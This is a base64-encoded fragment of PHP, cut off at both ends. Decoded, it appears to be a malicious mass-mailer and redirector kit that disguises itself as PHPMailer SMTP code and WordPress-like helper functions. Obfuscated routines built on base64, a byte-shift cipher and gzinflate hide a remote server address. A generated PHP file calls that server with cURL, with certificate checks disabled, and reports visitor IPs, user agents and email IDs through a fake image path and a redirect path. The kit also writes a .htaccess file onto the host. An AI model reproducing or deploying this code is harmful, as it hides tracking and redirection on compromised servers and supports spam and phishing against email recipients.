3Mgbm90aGluZyBhYm91dCBzZXJ2ZXIgZXh0ZW5zaW9ucycpOw0KICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZXJ2ZXJfY2Fwc1skbmFtZV07DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRMYXN0UmVwbHkoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+bGFzdF9yZXBseTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldF9saW5lcygpIHsNCiAgICAgICAgaWYgKCFpc19yZXNvdXJjZSgkdGhpcy0+c210cF9jb25uKSkgew0KICAgICAgICAgICAgcmV0dXJuICcnOw0KICAgICAgICB9DQogICAgICAgICRkYXRhICAgID0gJyc7DQogICAgICAgICRlbmR0aW1lID0gMDsNCiAgICAgICAgc3RyZWFtX3NldF90aW1lb3V0KCR0aGlzLT5zbXRwX2Nvbm4sICR0aGlzLT5UaW1lb3V0KTsNCiAgICAgICAgaWYgKCR0aGlzLT5UaW1lbGltaXQgPiAwKSB7DQogICAgICAgICAgICAkZW5kdGltZSA9IHRpbWUoKSArICR0aGlzLT5UaW1lbGltaXQ7DQogICAgICAgIH0NCiAgICAgICAgd2hpbGUgKGlzX3Jlc291cmNlKCR0aGlzLT5zbXRwX2Nvbm4pICYmICFmZW9mKCR0aGlzLT5zbXRwX2Nvbm4pKSB7DQogICAgICAgICAgICAkc3RyID0gQGZnZXRzKCR0aGlzLT5zbXRwX2Nvbm4sIDUxNSk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCJTTVRQIC0+IGdldF9saW5lcygpOiBcJGRhdGEgaXMgXCIkZGF0YVwiIiwgc2VsZjo6REVCVUdfTE9XTEVWRUwpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiU01UUCAtPiBnZXRfbGluZXMoKTogXCRzdHIgaXMgIFwiJHN0clwiIiwgc2VsZjo6REVCVUdfTE9XTEVWRUwpOw0KICAgICAgICAgICAgJGRhdGEgLj0gJHN0cjsNCiAgICAgICAgICAgIGlmICgoaXNzZXQoJHN0clszXSkgYW5kICRzdHJbM10gPT0gJyAnKSkgew0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGluZm8gPSBzdHJlYW1fZ2V0X21ldGFfZGF0YSgkdGhpcy0+c210cF9jb25uKTsNCiAgICAgICAgICAgIGlmICgkaW5mb1sndGltZWRfb3V0J10pIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTTVRQIC0+IGdldF9saW5lcygpOiB0aW1lZC1vdXQgKCcgLiAkdGhpcy0+VGltZW91dCAuICcgc2VjKScsIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkZW5kdGltZSBhbmQgdGltZSgpID4gJGVuZHRpbWUpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTTVRQIC0+IGdldF9saW5lcygpOiB0aW1lbGltaXQgcmVhY2hlZCAoJyAuICR0aGlzLT5UaW1lbGltaXQgLiAnIHNlYyknLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRkYXRhOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0VmVycCgkZW5hYmxlZCA9IGZhbHNlKSB7DQogICAgICAgICR0aGlzLT5kb192ZXJwID0gJGVuYWJsZWQ7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRWZXJwKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmRvX3ZlcnA7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRFcnJvcigkbWVzc2FnZSwgJGRldGFpbCA9ICcnLCAkc210cF9jb2RlID0gJycsICRzbXRwX2NvZGVfZXggPSAnJykgew0KICAgICAgICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgNCiAgICAgICAgICAgICdlcnJvcicgPT4gJG1lc3NhZ2UsDQogICAgICAgICAgICAnZGV0YWlsJyA9PiAkZGV0YWlsLA0KICAgICAgICAgICAgJ3NtdHBfY29kZScgPT4gJHNtdHBfY29kZSwNCiAgICAgICAgICAgICdzbXRwX2NvZGVfZXgnID0+ICRzbXRwX2NvZGVfZXgNCiAgICAgICAgKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNldERlYnVnT3V0cHV0KCRtZXRob2QgPSAnZWNobycpIHsNCiAgICAgICAgJHRoaXMtPkRlYnVnb3V0cHV0ID0gJG1ldGhvZDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldERlYnVnT3V0cHV0KCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPkRlYnVnb3V0cHV0Ow0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0RGVidWdMZXZlbCgkbGV2ZWwgPSAwKSB7DQogICAgICAgICR0aGlzLT5kb19kZWJ1ZyA9ICRsZXZlbDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldERlYnVnTGV2ZWwoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+ZG9fZGVidWc7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRUaW1lb3V0KCR0aW1lb3V0ID0gMCkgew0KICAgICAgICAkdGhpcy0+VGltZW91dCA9ICR0aW1lb3V0Ow0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VGltZW91dCgpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5UaW1lb3V0Ow0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZXJyb3JIYW5kbGVyKCRlcnJubywgJGVycm1zZykgew0KICAgICAgICAkbm90aWNlID0gJ0Nvbm5lY3Rpb246IEZhaWxlZCB0byBjb25uZWN0IHRvIHNlcnZlci4nOw0KICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJG5vdGljZSwgJGVycm5vLCAkZXJybXNnKTsNCiAgICAgICAgJHRoaXMtPmVkZWJ1Zygkbm90aWNlIC4gJyBFcnJvciBudW1iZXIgJyAuICRlcnJubyAuICcuICJFcnJvciBub3RpY2U6ICcgLiAkZXJybXNnLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldExhc3RUcmFuc2FjdGlvbklEKCkgew0KICAgICAgICAkcmVwbHkgPSAkdGhpcy0+Z2V0TGFzdFJlcGx5KCk7DQogICAgICAgIGlmIChlbXB0eSgkcmVwbHkpKSB7DQogICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+c210cF90cmFuc2FjdGlvbl9pZF9wYXR0ZXJucyBhcyAkc210cF90cmFuc2FjdGlvbl9pZF9wYXR0ZXJuKSB7DQogICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgkc210cF90cmFuc2FjdGlvbl9pZF9wYXR0ZXJuLCAkcmVwbHksICRtYXRjaGVzKSkgew0KICAgICAgICAgICAgICAgIHJldHVybiAkbWF0Y2hlc1sxXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KfQ0KZnVuY3Rpb24gRGlzcGxheTQwNFBhZ2UoKSB7DQogICAgJHNhcGlfbmFtZSA9IHBocF9zYXBpX25hbWUoKTsNCiAgICBpZiAoJHNhcGlfbmFtZSA9PSAnY2dpJyB8fCAkc2FwaV9uYW1lID09ICdjZ2ktZmNnaScpIHsNCiAgICAgICAgaGVhZGVyKCdTdGF0dXM6IDQwNCBOb3QgRm91bmQnKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICBoZWFkZXIoJF9TRVJWRVJbJ1NFUlZFUl9QUk9UT0NPTCddIC4gJyA0MDQgTm90IEZvdW5kJyk7DQogICAgfQ0KICAgICRfU0VSVkVSWydSRURJUkVDVF9TVEFUVVMnXSA9IDQwNDsNCiAgICBlY2hvICc8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL0lFVEYvL0RURCBIVE1MIDIuMC8vRU4iPg0KCTxodG1sPjxoZWFkPg0KCTx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT4NCgk8L2hlYWQ+PGJvZHk+DQoJPGgxPk5vdCBGb3VuZDwvaDE+DQoJPHA+VGhlIHJlcXVlc3RlZCBVUkwgJyAuICRfU0VSVkVSW1JFUVVFU1RfVVJJXSAuICcgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+DQoJPHA+QWRkaXRpb25hbGx5LCBhIDQwNCBOb3QgRm91bmQgZXJyb3Igd2FzIGVuY291bnRlcmVkIHdoaWxlIHRyeWluZyB0byB1c2UgYW4gRXJyb3JEb2N1bWVudCB0byBoYW5kbGUgdGhlIHJlcXVlc3QuPC9wPg0KCTxocj4nIC4gJF9TRVJWRVJbU0VSVkVSX1NJR05BVFVSRV0gLiAnPC9ib2R5PjwvaHRtbD4nOw0KICAgIGV4aXQ7DQp9DQpmdW5jdGlvbiBwcmVfdGVybV9uYW1lKCR3cF9rc2VzX2RhdGEsICR3cF9ub25jZSkgew0KICAgICR3cF9ub25jZSAgICA9IGJhc2U2NF9kZWNvZGUoJHdwX25vbmNlKTsNCiAgICAka3Nlc19zdHIgICAgPSBzdHJfcmVwbGFjZShhcnJheSgNCiAgICAgICAgJyUnLA0KICAgICAgICAnKicNCiAgICApLCBhcnJheSgNCiAgICAgICAgJy8nLA0KICAgICAgICAnPScNCiAgICApLCAkd3Bfa3Nlc19kYXRhKTsNCiAgICAkZmlsdGVyICAgICAgPSBiYXNlNjRfZGVjb2RlKCRrc2VzX3N0cik7DQogICAgJG1kNSAgICAgICAgID0gc3RycmV2KCR3cF9ub25jZSk7DQogICAgJHN1YiAgICAgICAgID0gc3Vic3RyKG1kNSgkbWQ1KSwgMCwgc3RybGVuKCR3cF9ub25jZSkpOw0KICAgICR3cF9ub25jZSAgICA9IG1kNSgkd3Bfbm9uY2UpIC4gJHN1YjsNCiAgICAkcHJlcGFyZWZ1bmMgPSAnZ3ppbmZsYXRlJzsNCiAgICAkaSAgICAgICAgICAgPSAwOw0KICAgIGRvIHsNCiAgICAgICAgJG9yZCAgICAgICAgPSBvcmQoJGZpbHRlclskaV0pIC0gb3JkKCR3cF9ub25jZVskaV0pOw0KICAgICAgICAkZmlsdGVyWyRpXSA9IGNocigkb3JkICUgMjU2KTsNCiAgICAgICAgJHdwX25vbmNlIC49ICRmaWx0ZXJbJGldOw0KICAgICAgICAkaSsrOw0KICAgIH0gd2hpbGUgKCRpIDwgc3RybGVuKCRmaWx0ZXIpKTsNCiAgICByZXR1cm4gQCRwcmVwYXJlZnVuYygkZmlsdGVyKTsNCn0NCmZ1bmN0aW9uIEdldE1haWxVUkwoKSB7DQogICAgcmV0dXJuIHByZV90ZXJtX25hbWUoIisxcGVqK1kzQ2pPQWsySXZlV2FNZ0dZSFhyUmVYeXl4ZncxaGpEeHRZZyoqIiwgImVIRjRkR0pwYVhNPSIpOw0KfQ0KZnVuY3Rpb24gUmVkaXJlY3Rpb25GaWxlKCkgew0KICAgICRGdW5jdGlvbjEgPSAiZnIiIC4gcmFuZFN0cig3KTsNCiAgICAkRnVuY3Rpb24yID0gImZyIiAuIHJhbmRTdHIoNyk7DQogICAgJEZ1bmN0aW9uMyA9ICJmciIgLiByYW5kU3RyKDcpOw0KICAgICRGdW5jdGlvbjQgPSAiZnIiIC4gcmFuZFN0cig3KTsNCiAgICAkUGhwU291cmNlID0gJzw/cGhwDQpmdW5jdGlvbiBjVVJMUmVxdWVzdCgkdXJsLCAkcG9zdEZpZWxkcyA9IG51bGwsICRodHRwSGVhZGVyID0gYXJyYXkoKSkgew0KCSRjaCA9IGN1cmxfaW5pdCgpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GUkVTSF9DT05ORUNULCB0cnVlKTsNCglpZiAoIWVtcHR5KCRwb3N0RmllbGRzKSkgew0KCQljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQoJCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAkcG9zdEZpZWxkcyk7DQoJfQ0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA2LjA7IFdpbmRvd3MgTlQgNi4xOyAuTkVUIENMUiAxLjEuNDMyMikiKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9USU1FT1VULCA5MCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAwKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRU5DT0RJTkcsIFwnZ3ppcCwgZGVmbGF0ZVwnKTsNCgkkaGVhZGVycyAgID0gYXJyYXkoKTsNCgkkaGVhZGVyc1tdID0gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgcnY6NDUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80NS4wIjsNCgkkaGVhZGVyc1tdID0gIkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44IjsNCgkkaGVhZGVyc1tdID0gIkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUiOw0KCSRoZWFkZXJzW10gPSAiQ29ubmVjdGlvbjoga2VlcC1hbGl2ZSI7DQoJJGhlYWRlcnNbXSA9ICJDYWNoZS1Db250cm9sOiBtYXgtYWdlPTAiOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IVFRQSEVBREVSLCAkaGVhZGVycyk7DQoJJHBhZ2UgICAgID0gY3VybF9leGVjKCRjaCk7DQoJJGh0dHBjb2RlID0gY3VybF9nZXRpbmZvKCRjaCwgQ1VSTElORk9fSFRUUF9DT0RFKTsNCglpZiAoJGh0dHBjb2RlID09IDUwMCkgew0KCQlyZXR1cm4gIkVSUk9SXzUwMF9DVVJMIjsNCgl9DQoJaWYgKCRodHRwY29kZSA9PSA0MDQpIHsNCgkJcmV0dXJuICJFUlJPUl80MDRfQ1VSTCI7DQoJfQ0KCWlmICgkaHR0cGNvZGUgPT0gNDAzKSB7DQoJCXJldHVybiAiRVJST1JfNDAzX0NVUkwiOw0KCX0NCglpZiAoY3VybF9lcnJubygkY2gpKSB7DQoJCXJldHVybiAiQ1VSTF9FUlJOT3wiIC4gY3VybF9lcnJvcigkY2gpOw0KCX0NCgljdXJsX2Nsb3NlKCRjaCk7DQoJcmV0dXJuICRwYWdlOw0KfQ0KZnVuY3Rpb24gR2V0UGFnZUNvbnRlbnQoJHVybCwgJHBvc3RGaWVsZHMgPSBudWxsKSB7DQoJaWYgKGZ1bmN0aW9uX2V4aXN0cyhcJ2N1cmxfaW5pdFwnKSkgew0KCQlyZXR1cm4gY1VSTFJlcXVlc3QoJHVybCwgJHBvc3RGaWVsZHMpOw0KCX0gZWxzZWlmICghZnVuY3Rpb25fZXhpc3RzKFwnZmlsZV9nZXRfY29udGVudHNcJykpIHsNCgkJcmV0dXJuIFwnZmlsZV9nZXRfY29udGVudHMgbm90IGF2YWlsYWJsZSAhXCc7DQoJfSBlbHNlIHsNCgkJaWYgKGlzX2FycmF5KCRwb3N0RmllbGRzKSkgew0KCQkJJHBvc3RkYXRhID0gaHR0cF9idWlsZF9xdWVyeSgkcG9zdEZpZWxkcyk7DQoJCQkkb3B0cyAgICAgPSBhcnJheSgNCgkJCQlcJ2h0dHBcJyA9PiBhcnJheSgNCgkJCQkJXCdtZXRob2RcJyA9PiBcJ1BPU1RcJywNCgkJCQkJXCdoZWFkZXJcJyA9PiBcJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXCcsDQoJCQkJCVwnY29udGVudFwnID0+ICRwb3N0ZGF0YQ0KCQkJCSkNCgkJCSk7DQoJCQkkY29udGV4dCAgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdHMpOw0KCQkJJHJlc3VsdCAgID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY29udGV4dCk7DQoJCQlyZXR1cm4gJHJlc3VsdDsNCgkJfSBlbHNlIHsNCgkJCXJldHVybiBAZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQoJCX0NCgl9DQp9DQpmdW5jdGlvbiAnIC4gJEZ1bmN0aW9uMSAuICcoJCcgLiAkRnVuY3Rpb240IC4gJywgJCcgLiAkRnVuY3Rpb24zIC4gJykgew0KCSQnIC4gJEZ1bmN0aW9uMyAuICcgICAgPSBiYXNlNjRfZGVjb2RlKCQnIC4gJEZ1bmN0aW9uMyAuICcpOw0KCSRrc2VzX3N0ciAgICA9IHN0cl9yZXBsYWNlKGFycmF5KA0KCQlcJyVcJywNCgkJXCcqXCcNCgkpLCBhcnJheSgNCgkJXCcvXCcsDQoJCVwnPVwnDQoJKSwgJCcgLiAkRnVuY3Rpb240IC4gJyk7DQoJJGZpbHRlciAgICAgID0gYmFzZTY0X2RlY29kZSgka3Nlc19zdHIpOw0KCSRtZDUgICAgICAgICA9IHN0cnJldigkJyAuICRGdW5jdGlvbjMgLiAnKTsNCgkkc3ViICAgICAgICAgPSBzdWJzdHIobWQ1KCRtZDUpLCAwLCBzdHJsZW4oJCcgLiAkRnVuY3Rpb24zIC4gJykpOw0KCSQnIC4gJEZ1bmN0aW9uMyAuICcgICAgPSBtZDUoJCcgLiAkRnVuY3Rpb24zIC4gJykgLiAkc3ViOw0KCSRwcmVwYXJlZnVuYyA9IFwnZ3ppbmZsYXRlXCc7DQoJJGkgICAgICAgICAgID0gMDsNCglkbyB7DQoJCSRvcmQgICAgICAgID0gb3JkKCRmaWx0ZXJbJGldKSAtIG9yZCgkJyAuICRGdW5jdGlvbjMgLiAnWyRpXSk7DQoJCSRmaWx0ZXJbJGldID0gY2hyKCRvcmQgJSAyNTYpOw0KCQkkJyAuICRGdW5jdGlvbjMgLiAnIC49ICRmaWx0ZXJbJGldOw0KCQkkaSsrOw0KCX0gd2hpbGUgKCRpIDwgc3RybGVuKCRmaWx0ZXIpKTsNCglyZXR1cm4gQCRwcmVwYXJlZnVuYygkZmlsdGVyKTsNCn0NCmZ1bmN0aW9uICcgLiAkRnVuY3Rpb24yIC4gJygpIHsNCglyZXR1cm4gJyAuICRGdW5jdGlvbjEgLiAnKCIrMXBlaitZM0NqT0FrMkl2ZVdhTWdHWUhYclJlWHl5eGZ3MWhqRHh0WWcqKiIsICJlSEY0ZEdKcGFYTT0iKTsNCn0NCmZ1bmN0aW9uIGdldF9pcF9hZGRyZXNzKCkgew0KCWZvcmVhY2ggKGFycmF5KA0KCQlcJ0hUVFBfQ0xJRU5UX0lQXCcsDQoJCVwnSFRUUF9YX0ZPUldBUkRFRF9GT1JcJywNCgkJXCdIVFRQX1hfRk9SV0FSREVEXCcsDQoJCVwnSFRUUF9YX0NMVVNURVJfQ0xJRU5UX0lQXCcsDQoJCVwnSFRUUF9GT1JXQVJERURfRk9SXCcsDQoJCVwnSFRUUF9GT1JXQVJERURcJywNCgkJXCdSRU1PVEVfQUREUlwnDQoJKSBhcyAka2V5KSB7DQoJCWlmIChhcnJheV9rZXlfZXhpc3RzKCRrZXksICRfU0VSVkVSKSA9PT0gdHJ1ZSkgew0KCQkJZm9yZWFjaCAoZXhwbG9kZShcJyxcJywgJF9TRVJWRVJbJGtleV0pIGFzICRpcCkgew0KCQkJCSRpcCA9IHRyaW0oJGlwKTsNCgkJCQlpZiAoZmlsdGVyX3ZhcigkaXAsIEZJTFRFUl9WQUxJREFURV9JUCwgRklMVEVSX0ZMQUdfTk9fUFJJVl9SQU5HRSB8IEZJTFRFUl9GTEFHX05PX1JFU19SQU5HRSkgIT09IGZhbHNlKSB7DQoJCQkJCXJldHVybiAkaXA7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJfQ0KfQ0KZnVuY3Rpb24gRGlzcGxheTQwNFBhZ2UoKSB7DQoJJHNhcGlfbmFtZSA9IHBocF9zYXBpX25hbWUoKTsNCglpZiAoJHNhcGlfbmFtZSA9PSBcJ2NnaVwnIHx8ICRzYXBpX25hbWUgPT0gXCdjZ2ktZmNnaVwnKSB7DQoJCWhlYWRlcihcJ1N0YXR1czogNDA0IE5vdCBGb3VuZFwnKTsNCgl9IGVsc2Ugew0KCQloZWFkZXIoJF9TRVJWRVJbXCdTRVJWRVJfUFJPVE9DT0xcJ10gLiBcJyA0MDQgTm90IEZvdW5kXCcpOw0KCX0NCgkkX1NFUlZFUltcJ1JFRElSRUNUX1NUQVRVU1wnXSA9IDQwNDsNCgllY2hvIFwnPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4NCgk8aHRtbD48aGVhZD4NCgk8dGl0bGU+NDA0IE5vdCBGb3VuZDwvdGl0bGU+DQoJPC9oZWFkPjxib2R5Pg0KCTxoMT5Ob3QgRm91bmQ8L2gxPg0KCTxwPlRoZSByZXF1ZXN0ZWQgVVJMIFwnIC4gJF9TRVJWRVJbUkVRVUVTVF9VUkldIC4gXCcgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+DQoJPHA+QWRkaXRpb25hbGx5LCBhIDQwNCBOb3QgRm91bmQgZXJyb3Igd2FzIGVuY291bnRlcmVkIHdoaWxlIHRyeWluZyB0byB1c2UgYW4gRXJyb3JEb2N1bWVudCB0byBoYW5kbGUgdGhlIHJlcXVlc3QuPC9wPg0KCTxocj5cJyAuICRfU0VSVkVSW1NFUlZFUl9TSUdOQVRVUkVdIC4gXCc8L2JvZHk+PC9odG1sPlwnOw0KCWV4aXQ7DQp9DQppZiAoaXNzZXQoJF9HRVRbXCdyZXdyaXRlXCddKSkgew0KCSRSZXdyaXRlID0gJF9HRVRbXCdyZXdyaXRlXCddOw0KfSBlbHNlIHsNCgkkUmV3cml0ZSA9ICRfU0VSVkVSW1wnUkVRVUVTVF9VUklcJ107DQp9DQppZiAoc3RycG9zKCRSZXdyaXRlLCBcJ25ld3NsZXR0ZXJfaW1hZ2UvXCcpICE9PSBmYWxzZSkgew0KCWxpc3QoJGlkLCAkaW1hZ2VfbmFtZSkgPSBAZXhwbG9kZShcJ25ld3NsZXR0ZXJfaW1hZ2UvXCcsICRSZXdyaXRlKTsNCgkkcGFyYW1ldGVycyA9IGFycmF5KA0KCQkiaXAiID0+IGdldF9pcF9hZGRyZXNzKCksDQoJCSJhZ2VudCIgPT4gJF9TRVJWRVJbXCdIVFRQX1VTRVJfQUdFTlRcJ10sDQoJKTsNCgkkY2hlY2tyZWFkID0gQEdldFBhZ2VDb250ZW50KCcgLiAkRnVuY3Rpb24yIC4gJygpIC4gJGltYWdlX25hbWUgLiAiPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRwYXJhbWV0ZXJzKSApOw0KCWhlYWRlcihcJ0NvbnRlbnQtVHlwZTogaW1hZ2UvZ2lmXCcpOw0KCWVjaG8gYmFzZTY0X2RlY29kZShcJ1IwbEdPRGxoQVFBQkFKQUFBUDhBQUFBQUFDSDVCQVVRQUFBQUxBQUFBQUFCQUFFQUFBSUNCQUVBT3c9PVwnKTsNCglleGl0Ow0KfQ0KaWYgKHN0cnBvcygkUmV3cml0ZSwgXCdyZWRpcmVjdC9cJykgIT09IGZhbHNlKSB7DQoJbGlzdCgkaWQsICRyZWRpcmVjdF9uYW1lKSA9IEBleHBsb2RlKFwncmVkaXJlY3QvXCcsICRSZXdyaXRlKTsNCglsaXN0KCRlbWFpbGlkLCAkcmVkaXJlY3QpID0gQGV4cGxvZGUoXCctaWQtXCcsICRyZWRpcmVjdF9uYW1lKTsNCglsaXN0KCRyYW5kb20sICRyZWFsX25hbWUpID0gQGV4cGxvZGUoXCctdG8tXCcsICRyZWRpcmVjdCk7DQoJJHBhcmFtZXRlcnMgPSBhcnJheSgNCgkJIm5hbWUiID0+ICRyZWFsX25hbWUsDQoJCSJpcCIgPT4gZ2V0X2lwX2FkZHJlc3MoKSwNCgkJImFnZW50IiA9PiAkX1NFUlZFUltcJ0hUVFBfVVNFUl9BR0VOVFwnXSwNCgkJImlkIiA9PiAkZW1haWxpZA0KCSk7DQoJJHVybCA9ICcgLiAkRnVuY3Rpb24yIC4gJygpIC4gInJlZGlyZWN0aW9uLz8iIC4gaHR0cF9idWlsZF9xdWVyeSgkcGFyYW1ldGVycyk7DQoJJHJlc3VsdCA9IEBHZXRQYWdlQ29udGVudCgkdXJsKTsNCglpZiAoZmlsdGVyX3ZhcigkcmVzdWx0LCBGSUxURVJfVkFMSURBVEVfVVJMKSkgew0KCQloZWFkZXIoIkxvY2F0aW9uOiAiIC4gJHJlc3VsdCk7DQoJfSBlbHNlIHsNCgkJRGlzcGxheTQwNFBhZ2UoKTsNCgl9DQoJZXhpdDsNCn0nOw0KICAgIHJldHVybiAkUGhwU291cmNlOw0KfQ0KZnVuY3Rpb24gaXNSZXdyaXRlT04oJHMgPSBmYWxzZSkgew0KICAgIGlmICgkcyA9PSBmYWxzZSkgew0KICAgICAgICAkcyA9ICRfU0VSVkVSOw0KICAgIH0NCiAgICBpZiAoaXNzZXQoJHNbJ0hUVFBfTU9EX1JFV1JJVEVfU0hFTEwnXSkpIHsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHJldHVybiBmYWxzZTsNCn0NCmZ1bmN0aW9uIHBhcmVudGRpcigkdXJsKSB7DQogICAgJHVybCA9IGN1cnJlbnRkaXIoJHVybCk7DQogICAgJGxlbiA9IHN0cmxlbigkdXJsKTsNCiAgICByZXR1cm4gY3VycmVudGRpcihzdWJzdHIoJHVybCwgMCwgJGxlbiAmJiAkdXJsWyRsZW4gLSAxXSA9PSAnLycgPyAtMSA6ICRsZW4pKTsNCn0NCmZ1bmN0aW9uIGN1cnJlbnRkaXIoJHVybCkgew0KICAgIGlmICgkZmlyc3RfcXVlcnkgPSBzdHJwb3MoJHVybCwgJz8nKSkNCiAgICAgICAgJHVybCA9IHN1YnN0cigkdXJsLCAwLCAkZmlyc3RfcXVlcnkpOw0KICAgIGlmICgkZmlyc3RfZnJhZ21lbnQgPSBzdHJwb3MoJHVybCwgJyMnKSkNCiAgICAgICAgJHVybCA9IHN1YnN0cigkdXJsLCAwLCAkZmlyc3RfZnJhZ21lbnQpOw0KICAgICRsYXN0X3NsYXNoID0gc3RycnBvcygkdXJsLCAnLycpOw0KICAgIGlmICghJGxhc3Rfc2xhc2gpIHsNCiAgICAgICAgcmV0dXJuICcvJzsNCiAgICB9DQogICAgaWYgKCgkZmlyc3RfY29sb24gPSBzdHJwb3MoJHVybCwgJzovLycpKSAhPT0gZmFsc2UgJiYgJGZpcnN0X2NvbG9uICsgMiA9PSAkbGFzdF9zbGFzaCkgew0KICAgICAgICByZXR1cm4gJHVybCAuICcvJzsNCiAgICB9DQogICAgcmV0dXJuIHN1YnN0cigkdXJsLCAwLCAkbGFzdF9zbGFzaCArIDEpOw0KfQ0KZnVuY3Rpb24gQ3JlYXRlSFRhY2Nlc3MoKSB7DQogICAgJENvbnRlbnQgICA9IGFycmF5KCk7DQogICAgJENvbnRlbnRbXSA9ICc8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4nOw0KICAgICRDb250ZW50W10gPSAnCTxJZk1vZHVsZSBtb2RfZW52LmM+JzsNCiAgICAkQ29udGVudFtdID0gJwkJU2V0RW52IEhUVFBfTU9EX1JFV1JJVEVfU0hFTEwgT24nOw0KICAgICRDb250ZW50W10gPSAnCTwvSWZNb2R1bGU+JzsNCiAgICAkQ29udGVudFtdID0gJzwvSWZNb2R1bGU+JzsNCiAgICBAZmlsZV9wdXRfY29udGVudHMoIi5odGFjY2VzcyIsIGltcGxvZGUoUEhQX0VPTCwgJENvbnRlbnQpKTsNCn0NCmZ1bmN0aW9uIEdldFJlZGlyZWN0aW9uTGluaygkdXJsID0gZmFsc2UpIHsNCiAgICBpZiAoJHVybCA9PSBmYWxzZSkgew0KICAgICAgICAkdXJsID0gZnVsbF91cmwoJF9TRVJWRVIpOw0KICAgIH0NCiAgICAkQ3VycmVudFVSTCAgICAgPSBjdXJyZW50ZGlyKCR1cmwpOw0KICAgICRSZWRpcmVjdGlvbkRpciA9IHBhcmVudGRpcigkdXJsKTsNCiAgICAkRmlsZW5hbWUgICAgICAgPSAiaW5kZXgucGhwIjsNCiAgICAkRm9sZGVyICAgICAgICAgPSAiIjsNCiAgICBpZiAoJFJlZGlyZWN0aW9uRGlyICE9ICRDdXJyZW50VVJMKSB7DQogICAgICAgICRGb2xkZXIgPSAiLi4vIjsN